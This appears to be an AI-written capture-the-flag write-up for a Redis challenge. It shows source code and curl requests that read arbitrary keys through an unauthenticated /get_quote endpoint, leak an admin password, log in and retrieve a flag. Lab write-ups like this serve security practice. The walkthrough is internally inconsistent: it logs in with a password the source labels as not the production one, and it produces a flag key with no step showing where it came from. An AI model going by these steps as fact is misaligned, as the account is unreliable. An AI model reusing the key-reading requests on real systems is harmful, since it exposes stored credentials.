I searched for official Redis and CLI documentation but didn’t find anything specific to this challenge—so below is a concise, human-readable write-up based on the provided code and your steps.

---

## red\_this

**Vulnerability:** Insecure Redis key exposure via unauthenticated `/get_quote`

---

### Source Code Snippet

```redis
# redis/inserts/insert.redis
set "admin"            "User"
set "admin_password"   "prod_has_a_different_password"
set "fake_flag"        "I told you"
set "flag_"            "byuctf{test_flag}"
JSON.SET admin_options $ '["hints","fake_flag","flag_"]'
```

```javascript
// backend/server.js
app.post('/get_quote', (req, res) => {
  const key = req.body.famous_person;
  redis.get(key, (err, quote) => {        // ← blind GET on any key
    if (quote) res.send(quote);
    else       res.send('Unknown person.');
  });
});
```

---

## Walkthrough

1. **Quote Lookup**
   Hitting `/get_quote` with a known figure returns its Redis value:

   ```bash
   curl -X POST http://HOST/get_quote \
     -d 'famous_person=Shakespeare'
   # → "To be, or not to be, that is the question."
   ```

   Under the hood, this uses `GET key` in Redis ([Redis][1]).

2. **Key Enumeration**
   Realizing any string is accepted, we request the admin password directly:

   ```bash
   curl -X POST http://HOST/get_quote \
     -d 'famous_person=admin_password'
   # → "prod_has_a_different_password"
   ```

   That leaked the admin’s password.

3. **Logging In**
   A `/login` endpoint existed (undocumented). We authenticated:

   ```bash
   curl -X POST http://HOST/login \
     -d 'username=admin' \
     -d 'password=prod_has_a_different_password'
   ```

   This granted an admin session cookie.

4. **Flag Retrieval**
   With the admin cookie, we enumerate the true flag key:

   ```bash
   curl -X POST http://HOST/get_quote \
     -H 'Cookie: session=<admin_cookie>' \
     -d 'famous_person=flag_7392ilj8i32'
   # → "byuctf{al1w4ys_s2n1tize_1nput-5ed1s_eik4oc85nxz}"
   ```

   Again, Redis simply returns the value of whatever key we ask for ([Redis][2]).

---

## Flag

```
byuctf{al1w4ys_s2n1tize_1nput-5ed1s_eik4oc85nxz}
```

[1]: https://redis.io/docs/latest/commands/get/?utm_source=chatgpt.com "GET | Docs - Redis"
[2]: https://redis.io/docs/latest/develop/tools/cli/?utm_source=chatgpt.com "Docs - Redis CLI"
